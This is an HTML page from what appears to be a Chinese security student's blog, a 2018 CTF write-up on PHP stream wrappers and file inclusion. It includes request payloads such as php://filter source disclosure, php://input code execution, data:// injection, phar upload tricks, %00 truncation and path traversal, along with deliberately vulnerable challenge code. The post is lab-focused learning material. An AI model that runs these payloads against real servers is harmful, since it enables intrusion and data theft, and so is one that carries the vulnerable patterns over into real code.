@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content=":smile:">
+    <meta name="keyword" content="">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="My Touch On IS" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        wp for JULY 11th｜undefined
+        
+    </title>
+
+    <link rel="canonical" href="http://yoursite.com/2018/07/10/wp-for-JULY-11th/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/blog-style.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+</head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    My Touch On IS
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+                        
+							
+                        <li>
+                            <a href="/Tags/">Tags</a>
+                        </li>
+							
+						
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img"
+     src="https://i.imgur.com/oXiH18Y.jpg#����Ĭ�ϵ�ͼƬ">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('https://i.imgur.com/oXiH18Y.jpg#����Ĭ�ϵ�ͼƬ')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>wp for JULY 11th</h1>
+                    
+                    <span class="meta">
+                         作者 sitarrr
+                        <span>
+                          日期 2018-07-10
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#PHP伪协议"
+                           title="PHP伪协议">PHP伪协议</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            wp for JULY 11th
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <h1>php伪协议总和</h1>
+<pre><code>file:// — 访问本地文件系统
+php:// — 访问各个输入/输出;（I/Ostreams）
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+phar:// — PHP 归档
+rar:// — RAR
+http:// — 访问 HTTP(s) 网址
+glob:// — 查找匹配的文件路径模式
+ssh2:// — Secure Shell 2
+ogg:// — 音频流
+expect:// — 处理交互式的流
+</code></pre>
+<h1>相关配置</h1>
+<pre><code>allow_url_fopen:能否远程文件包含
+allow_url_include:能否使用伪协议
+</code></pre>
+<p>以上两个配置会影响到fopen等等和include等等函数对于伪协议的支持</p>
+<h1>php伪协议应用</h1>
+<h2>#01</h2>
+<p>php://filter是一种元封装器，设计用于&quot;数据流打开&quot;时的&quot;筛选过滤&quot;应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启allow_url_include；</p>
+<p><a href="http://4.chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener">#01</a></p>
+<p><img src="https://i.imgur.com/D0GDlLc.png" alt=""></p>
+<p>1.输入<code>?file=php://filter/convert.base64-encode/resource=index.php</code>，获取base64编码，</p>
+<p><img src="https://i.imgur.com/P3NUnjp.png" alt=""></p>
+<p>2.利用base64解码工具获取源代码，得到flag:nctf{edulcni_elif_lacol_si_siht}</p>
+<pre><code>&lt;html&gt;
+&lt;title&gt;asdf&lt;/title&gt;
+
+&lt;?php
+error_reporting(0);
+if(!$_GET[file]){echo '&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;';}
+$file=$_GET['file'];
+if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){
+	echo &quot;Oh no!&quot;;
+	exit();
+}
+include($file); 
+//flag:nctf{edulcni_elif_lacol_si_siht}
+
+ ?&gt;
+&lt;/html&gt;
+</code></pre>
+<h2>#02</h2>
+<pre><code>extract() 函数从数组中将变量导入到当前的符号表。
+trim() 函数移除字符串两侧的空白字符或其他预定义字符。
+</code></pre>
+<p><a href="http://127.0.0.1/lianxi/input1/" target="_blank" rel="noopener">#02</a></p>
+<h3>源代码</h3>
+<pre><code>&lt;?php
+$flag='xxxxx';     
+extract($_GET);     //变量覆盖漏洞
+if(isset($shiyan)//判断变量是否存在
+{   
+    $content=trim($flag);//trim去空格后传给变量
+    if($shiyan==$content)
+       echo'flag{......}';     
+    else       
+       echo'Oh.no';  
+}
+?&gt;
+</code></pre>
+<p>em...文件不能运行，学姐说意会一下，利用extract()变量漏洞重新定义flag的值，这样就满足$shiyan==$content,得到flag</p>
+<h2>#03</h2>
+<p>file_get_contents() 函数把整个文件读入一个字符串中。</p>
+<p><a href="http://127.0.0.1/lianxi/data/" target="_blank" rel="noopener">#03</a></p>
+<h3>源代码</h3>
+<pre><code>&lt;?php
+$user=$_GET['user'];
+#echo $user;
+if(isset($user)&amp;&amp;(file_get_contents($user,'r')==='the user is admin'))
+    echo &quot;flag{xxxxxxxxxxxxx}&quot;;
+else
+    echo &quot;you are not admin ! &quot;;
+?&gt;
+</code></pre>
+<p><img src="https://i.imgur.com/8t8q8ML.png" alt=""></p>
+<p>进入页面显示you are not admin!</p>
+<p>根据题意创建一个数据流存储，</p>
+<p><strong>GET型</strong></p>
+<pre><code>?user=data://text/plain,the user is admin
+</code></pre>
+<p><img src="https://i.imgur.com/t6PfBC4.png" alt=""></p>
+<p><strong>POST型</strong></p>
+<pre><code>?user=php://input
+[POST]:the user is admin
+</code></pre>
+<p><img src="https://i.imgur.com/6xF21Tr.png" alt=""></p>
+<h2>#04</h2>
+<p><a href="http://level3.tasteless.eu/index.php" target="_blank" rel="noopener">#04</a></p>
+<p><img src="https://i.imgur.com/PJbg1SK.png" alt=""></p>
+<p>1.hint:包含的PHP.ini文件是在服务器上使用的配置文件的一部分。
+所以会有一些东西让你解决这个问题。</p>
+<p>2.file是其中一个变量，想Σ(｀д′*ノ)ノ先用</p>
+<pre><code>?file=php://input
+[POST]&lt;?php phpinfo(); ?&gt;
+</code></pre>
+<p>获取phpinfo找到document root找到文件路径/var/www/chall/level3</p>
+<p><img src="https://i.imgur.com/uQ5eIAO.png" alt=""></p>
+<p>3.进入路径获取当前文件夹下所有文件名?</p>
+<pre><code> file=php://input
+[POST]&lt;?php print_r(scandir('/var/www/chall/level3'))?&gt;
+</code></pre>
+<p><img src="https://i.imgur.com/sLAkjud.png" alt=""></p>
+<p>3.发现th3_fl4g文件，进入该文件，拿到flag
+<img src="https://i.imgur.com/osNrETo.png" alt=""></p>
+<h2>#05</h2>
+<p>eval(“xxxxxx”)执行括号内的代码，因此存在闭合漏洞</p>
+<p>REQUEST（）：说明get、post请求都被允许</p>
+<p><a href="http://127.0.0.1/lianxi/excute/" target="_blank" rel="noopener">#05</a></p>
+<h3>源代码</h3>
+<pre><code> &lt;?php
+    include &quot;flag.php&quot;;
+    $a = @$_REQUEST['hello'];
+    eval( &quot;var_dump($a);&quot;);
+    show_source(__FILE__);
+?&gt; 
+</code></pre>
+<h3>具体闭合</h3>
+<p><img src="https://i.imgur.com/HnzmGxm.png" alt=""></p>
+<h2>#06</h2>
+<p><a href="http://127.0.0.1/lianxi/input2/" target="_blank" rel="noopener">#06</a></p>
+<h3>源代码</h3>
+<pre><code> &lt;?php 
+    show_source(__FILE__);
+    if(isset($_REQUEST['path'])){
+        include($_REQUEST['path']);
+    }else{
+        include('phpinfo.php');
+    }
+?&gt; 
+</code></pre>
+<h3>具体步骤</h3>
+<p><strong>注：要打开allow_url_include</strong></p>
+<p>http://127.0.0.1/lianxi/input2/index.php?path=php://input
+&lt;?php print_r(scandir(&quot;D:/phpstudy/PHPTutorial/WWW/lianxi/input2&quot;));?&gt;</p>
+<p><img src="https://i.imgur.com/YnvsoDF.png" alt=""></p>
+<h2>#07PLUS（加时间戳）</h2>
+<pre><code> -phar:// —数据流包装器
+ -自PHPveision 5.3.0起开始有效
+ -php的一个函数，功能是解压还原,也可以执行php代码
+</code></pre>
+<p><a href="http://127.0.0.1/phar1" target="_blank" rel="noopener">#07</a></p>
+<p>1.打开网页，得到tip1:include.php,</p>
+<p><img src="https://i.imgur.com/a07Ngf1.png" alt=""></p>
+<p>2.进入include.php,界面如下，发现tip2:the parameter is file!,说明参数为file</p>
+<p><img src="https://i.imgur.com/sGxchPd.png" alt=""></p>
+<p>3.,并获取网页源代码，发现发现还有隐藏文件upload.php</p>
+<p><img src="https://i.imgur.com/f53SNcb.png" alt=""></p>
+<p>4.输入<code>?file=php://filter/convert.base64-encode/resource=include.php</code>，获取源代码，发现报错，</p>
+<p><img src="https://i.imgur.com/krFWjfm.jpg" alt=""></p>
+<p>5.根据报错位置可以发现源代码中自动添加了.php,修改后进入页面</p>
+<p><img src="https://i.imgur.com/axQepBx.png" alt=""></p>
+<p>6.通过base64解码得到源代码，找到文件命名格式upload/u_time()_ $_FILES[&quot;file&quot;][&quot;name&quot;]，，，，，，time()表示时间戳</p>
+<pre><code> &lt;form action=&quot;&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; 
+ name=&quot;upload&quot;&gt;file:&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;br&gt; 
+ &lt;input type=&quot;submit&quot; value=&quot;upload&quot; /&gt;&lt;/form&gt;
+
+&lt;?php
+ if(!empty($_FILES[&quot;file&quot;]))
+{
+    echo $_FILE[&quot;file&quot;];
+    $allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);
+    @$temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);
+    $extension = end($temp);
+    if (((@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)
+    || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)
+    || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))
+    &amp;&amp; (@$_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 102400) &amp;&amp; in_array($extension, $allowedExts))
+    {
+    $avatar = &quot;upload&quot; . &quot;/u_&quot;. time(). '_' . $_FILES[&quot;file&quot;][&quot;name&quot;];
+    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $avatar);
+    echo &quot;file upload successful!Save in:  &quot; . $avatar;
+    }
+    else
+    {
+        echo &quot;upload failed!&quot;;
+    }
+}
+?&gt;`
+</code></pre>
+<p>7.本地构造php文件，压缩，更改后缀名为允许上传的文件格式.jpg/.gif/.png</p>
+<p><img src="https://i.imgur.com/N4HJsIY.png" alt=""></p>
+<p>8.进入upload.php,上传压缩文件，用网页截包工具，找到文件上传时的时间戳Tue, 10 Jul 2018 08:51:07 GMT</p>
+<p><img src="https://i.imgur.com/2qDWQw1.png" alt=""></p>
+<p>9.编辑脚本工具，获取时间戳</p>
+<p><img src="https://i.imgur.com/S4qbOnQ.png" alt="">
+<img src="https://i.imgur.com/myr7eLd.png" alt=""></p>
+<p>10.利用时间戳命名文件名，并执行文件</p>
+<p><img src="https://i.imgur.com/WiWKbSs.png" alt=""></p>
+<h1>文件包含</h1>
+<h2>PHP文件包含漏洞</h2>
+<p>在通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来，就会导致文件信息的泄露甚至注入了恶意代码。</p>
+<p>-远程文件包含RFI      例如?file=http://hhddj/hhd.txt</p>
+<p>-本地文件包含LFI       例如?file=../hhd.txt</p>
+<h2>PHP文件包含的几个函数</h2>
+<p>include()：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。</p>
+<p>include_once()：和include()功能相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
+<p>require()：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。</p>
+<p>require_once()：和require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
+<h2>%00截断</h2>
+<p><strong>magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”</strong></p>
+<p>在php 5.3.4之前有效，magic_quotes_gpc = Off时，可以使用%00绕过</p>
+<p>$_GET[&quot;filename&quot;]中常见</p>
+<p>filename=test.php%00.txt</p>
+<p>主要利用常见：</p>
+<p>1.上传时路径必须为txt、png等结尾时</p>
+<p>2.文件下载时，绕过白名单检查</p>
+<p>3.文件包含时，截断后面限制(主要是本地包含时)</p>
+<h2>文件搜索</h2>
+<h3>从根目录搜索</h3>
+<pre><code>/../../../../../../www/dvwa/php.ini
+</code></pre>
+<p><strong>前面必须加/，表示从根目录开始</strong></p>
+<p><img src="https://i.imgur.com/rACjH57.png" alt=""></p>
+<h3>双写重构造</h3>
+<p><img src="https://i.imgur.com/o52Mh60.png" alt="">
+<img src="https://i.imgur.com/4MBpI9t.png" alt=""></p>
+<h2>file包含 ##.</h2>
+<pre><code>file://协议：本地包含文件（将绝对路径下的文件包含进来）
+</code></pre>
+<h3>漏洞利用</h3>
+<p>1.上传一个内容为php的文件</p>
+<p>2.利用file协议去包含上传文件（需要知道上传文件的绝对路径）</p>
+<p>3.实现任意命令执行。</p>
+<h3>源代码</h3>
+<pre><code>&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {//文件名必须以file开头
+    // This isn't the page we want!
+    echo &quot;ERROR: File not found!&quot;;
+    exit;
+}
+
+?&gt; 
+</code></pre>
+<p><img src="https://i.imgur.com/on8oiBe.png" alt=""></p>
+<p><img src="https://i.imgur.com/ydYGWk2.png" alt=""></p>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/2018/07/09/wp-for-JULY-9th/" data-toggle="tooltip" data-placement="top"
+                           title="wp for JULY 9th">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+                <!-- 来必力City版安装代码 -->
+                <div id="lv-container" data-id="city" data-uid="sitarrr">
+                    <script type="text/javascript">
+                        (function(d, s) {
+                            var j, e = d.getElementsByTagName(s)[0];
+
+                            if (typeof LivereTower === 'function') { return; }
+
+                            j = d.createElement(s);
+                            j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                            j.async = true;
+
+                            e.parentNode.insertBefore(j, e);
+                        })(document, 'script');
+                    </script>
+                    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+                </div>
+                <!-- City版安装代码已完成 -->
+                
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-text">php伪协议总和</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-text">相关配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-text">php伪协议应用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">#01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">#02</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">源代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">#03</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">源代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">#04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">#05</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">具体闭合</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">#06</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">具体步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">#07PLUS（加时间戳）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">PHP文件包含漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">PHP文件包含的几个函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">%00截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">文件搜索</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">从根目录搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">双写重构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">file包含 ##.</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">源代码</span></a></li></ol></li></ol></li></ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5 class="text-center">
+                        <a href="/tags/">FEATURED TAGS</a>
+                    </h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#PHP伪协议"
+                           title="PHP伪协议">PHP伪协议</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <div style="margin-top: 20px;">
+                    <h5 class="text-center">FRIENDS</h5>
+                    <ul class="list-inline text-center">
+                        
+                        <li><a href="http://dx670.github.io">dx670</a></li>
+                        
+                    </ul>
+                </div>
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/sitarrr">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; My Touch On IS 2018
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/blog.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://yoursite.com/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="https://i.imgur.com/E2zEHUZ.png">
+</body>
+
+</html>
